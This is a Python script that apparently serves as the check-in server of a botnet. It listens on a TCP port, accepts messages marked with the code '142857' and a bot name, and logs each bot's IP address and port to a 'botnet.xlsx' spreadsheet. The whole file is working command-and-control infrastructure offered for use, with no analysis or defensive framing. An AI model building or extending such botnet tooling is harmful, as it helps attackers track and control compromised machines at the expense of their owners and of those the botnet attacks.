from socket import *
import threading
import pandas as pd
globl_con = True


PORT_DEFAULT = 6789
BOTNET_PATH_DEFAULT = 'botnet.xlsx'


data_exc=pd.read_excel(BOTNET_PATH_DEFAULT)
botname2id = {}
def ip_address_anal(ip):
    if '.' not in ip:
        return ''
    str_ip = ip.split('.')
    if len(str_ip) != 4:
        return ''
    result = ''
    for numstr in str_ip:
        try:
            num = int(numstr)
        except:
            return ''
        if num >= 0 and num <= 255:
            result += str(num)
            result += '.'
            continue
        else:
            return ''
    return result[0:-1]

def port_address_judge(port):
    try:
        portnum = int(port)
    except:
        return -1
    if portnum >= 0 and portnum < 65535:
        return portnum
    return -1

def tcp_server_thread(client,bufsize,address_tcp):
    try:
        data = client.recv(bufsize)
        #print (data)
        data = data.decode()
        #print (data)
        if data[0:6] == '142857':
            #print ("received")
            #info = client.getpeername()
            botname = data[6:-1]
            print (data_exc)
            if botname in botname2id:
                #print ("hhhhh")
                data_exc.loc[[botname2id[botname]]] = [address_tcp[0], address_tcp[1]]
            else:
                #print ("aaaaa")
                botname2id[botname] = len(data_exc)
                print (botname2id[botname])
                #print (data_exc.loc[botname2id[botname]])
                data_exc.loc[botname2id[botname]] = [address_tcp[0],address_tcp[1]]
            #print ("aaaaa")
            with pd.ExcelWriter(BOTNET_PATH_DEFAULT) as writer:
                data_exc.to_excel(writer)
        #print ("aaaaa")
        client.send("byebye".encode())
        client.close()
    except Exception as e:
        print (e)
        print ("connection error:", address_tcp)

if __name__ == "__main__":
    thread_list = []
    HOST = '0.0.0.0'
    PORT = 2341
    su = socket(AF_INET,SOCK_DGRAM)
    s = socket(AF_INET,SOCK_STREAM)
    while True:
        set = input('set ip host and port:>>')
        if set == '':
            print("using default set...")
            try:
                s.bind((HOST, PORT))
                su.bind((HOST, PORT))
            except:
                print("invalid ip:port...")
                continue
            break
        elif ':' not in set:
            print("illegal set...")
            continue
        else:
            set = set.split(':')
            if len(set) != 2:
                print("illegal set...")
                continue
            ip = ip_address_anal(set[0])
            port = port_address_judge(set[1])
            if ip != '' and port != -1:
                print("using ip:"+ip+'; using port:'+str(port))
                HOST = ip
                PORT = port
                try:
                    s.bind((HOST, PORT))
                    su.bind((HOST, PORT))
                except:
                    print("invalid ip:port...")
                    continue
                break
            else:
                print("illegal set...")
                continue
    s.listen(100)
    print('...waiting for message')
    while True:
        client, address = s.accept()
        print(client)
        thread = threading.Thread(target=tcp_server_thread,args=(client,1024,address))
        thread_list.append(thread)
        thread.start()